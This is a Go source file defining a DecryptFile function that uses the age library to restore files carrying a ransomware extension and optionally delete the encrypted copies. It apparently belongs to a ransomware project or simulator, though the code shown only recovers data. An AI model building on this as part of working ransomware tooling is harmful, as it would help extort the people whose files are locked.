package crypto

import (
	"filippo.io/age"
	"fmt"
	"github.com/sirupsen/logrus"
	"io"
	"os"
	"strings"
)

// DecryptFile will decrypt any files ending with the ransomware extension and optionally remove the encrypted copy
func DecryptFile(l *logrus.Entry, cryptedPath string, identity age.Identity, delete bool) error {
	// try opening the
	cryptedFile, err := os.Open(cryptedPath)
	if err != nil {
		return fmt.Errorf("could not read file: %v", err)
	}
	defer cryptedFile.Close()

	reader, err := age.Decrypt(cryptedFile, identity)
	if err != nil {
		return fmt.Errorf("could setup encrypter: %v", err)
	}

	filePermissions := os.FileMode(0600)
	fileInfo, err := os.Stat(cryptedPath)
	if err != nil {
		l.WithError(err).WithField("path", cryptedPath).Error("could not retrieve file permissions, using 0600")
	} else {
		filePermissions = fileInfo.Mode()
	}

	orgiBytes, err := io.ReadAll(reader)
	if err != nil {
		return fmt.Errorf("could not read decrypted bytes: %v", err)
	}

	origPath := strings.TrimSuffix(cryptedPath, CryptedExtension)

	if err := os.WriteFile(origPath, orgiBytes, filePermissions); err != nil {
		return fmt.Errorf("could not write crypted file %s: %v", cryptedPath, err)
	}

	l.WithField("path", origPath).Debug("decrypted file")

	if delete {
		l.WithField("path", cryptedPath).Debug("deleting")

		if err := os.Remove(cryptedPath); err != nil {
			return fmt.Errorf("could not delete %s: %v", cryptedPath, err)
		} else {
			l.Debug("deleted original")
		}
	}

	return nil
}
